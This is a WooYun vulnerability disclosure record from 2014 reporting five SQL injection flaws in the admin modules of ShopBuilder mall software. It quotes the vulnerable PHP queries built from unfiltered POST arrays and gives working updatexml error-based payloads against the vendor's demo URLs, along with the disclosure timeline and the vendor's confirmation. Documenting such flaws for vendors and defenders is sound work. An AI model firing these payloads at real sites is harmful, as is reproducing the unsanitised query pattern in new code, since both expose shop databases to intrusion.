{"id": 51950, "wybug_id": "wooyun-2014-072830", "wybug_title": "ShopBuilder网上商城 post型 sql注入打包 (1~5) 官网demo测试成功", "wybug_corp": "mall-builder.com", "wybug_author": "roker", "wybug_date": "2014-09-29 18:48", "wybug_open_date": "2014-12-28 18:50", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-03：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-28：\t细节向公众公开  简要描述： rt业界良心，从不刷rank直接打包 /hx 详细说明：  post没有全局过滤直接注入就好啦~#1module/activity/admin/activity_product_list\nif(!empty($_POST['chk']))\t{\t\t@$id=implode(\",\",$_POST['chk']);\t\t\t\t//批量删除\t\tif($_POST['submit']==$lang['del'] and $id)\t\t{ \t\t\t$sql=\"delete from \".ACTIVITYPRODUCT.\" where product_id in ($id)\";\t\t\t$db->query($sql);\t\t\t$sql=\"update \".PRO.\" set promotion_id='0' where id in ($id)\";\t\t\t\t$db->query($sql);\t\t}\nchk没有过滤 分割后赋值给id带入了数据库post数据 chk[]=1) and 1=updatexml(1,concat(0x5c,(select user())),1)%23官网测试 \n\n(以下就不附图片了 直接贴代码)#2module/activity/admin/activity51行\nif($_POST['act']=='op')\t\t{\t\t\tif(is_array($_POST['chk']))\t\t\t{\t\t\t\t$id=implode(\",\",$_POST['chk']);\t\t\t\t$sql=\"delete from \".ACTIVITY.\" where id in ($id)\";\t\t\t\t$db->query($sql);\t\t\t\t$sql=\"delete from \".ACTIVITYPRODUCT.\" where activity_id in ($id)\";\t\t\t\t$db->query($sql);\t\t\t\tforeach($_POST['chk'] as $list)\t\t\t\t{\t\t\t\t\t$db->query(\"update \".PRO.\" set promotion_id=0 where promotion_id='$list'\");\t\t\t\t\t}\t\t\t}\nact=op时即可注入\nhttp://www.a5shop.cn/?m=activity/admin&s=activity post : chk[]=1) and 1=updatexml(1,concat(0x5c,(select user())),1)%23&act=op\n#3module/payment/admin/bank_account_mod\nif(isset($_POST[\"action\"])){\tif(isset($_POST[\"result\"]))\t{\t\t$add_time = time();\t\tif($_POST[\"result\"]==1)\t\t{\t\t\t$sql = \"update \".ACCOUNTS.\" set active=1, check_time='$add_time', censor='$_SESSION[ADMIN_USER]' where id=$_POST[id]\";\t\t\t$db->query($sql);\t\t}\t}\nresult=1且action有值时 即可注入id\nhttp://www.a5shop.cn/?m=payment/admin&s=bank_account_modpost: id=updatexml(1,concat(0x5c,(select user())),1)%23&action=a&result=1\n#4module/logistics/admin/logistics\nelse{\tif($_POST['act'] and is_array($_POST['chk']))\t{\t\t$id=implode(\",\",$_POST['chk']);\t\tif($_POST['act']=='open')\t\t{\t\t\t$db->query(\"update \".LGSTEMP.\" set status=1 where id in ($id) \");\t\t\t}\t\tif($_POST['act']=='close')\t\t{\t\t\t$db->query(\"update \".LGSTEMP.\" set status=0 where id in ($id) \");\n\nhttp://www.a5shop.cn/?m=logistics/admin&s=logisticspostchk[]=1) and 1=updatexml(1,concat(0x5c,(select user())),1)%23&act=open\n#5module/product/admin/product_comment\nif($_POST['act']=='op')\t{\t\tif(is_array($_POST['chk']))\t\t{\t\t\t$id=implode(\",\",$_POST['chk']);\t\t\tforeach($_POST[\"chk\"] as $val)\t\t\t{\t\t\t\t$sql=\"select * from \".PCOMMENT.\" where id=$val\";\t\t\t\t$db->query($sql);\nact = op 时分割chk数组带入val进行了查询\nhttp://www.a5shop.cn/?m=product/admin&s=product_commentpostchk[]=updatexml(1,concat(0x5c,(select user())),1)%23&act=op\n   漏洞证明：  \n\n   修复方案：  过滤   版权声明：转载请注明来源 roker@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：1  确认时间：2014-09-30 09:14 厂商回复： 新版本已修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 1, "Ranks": null}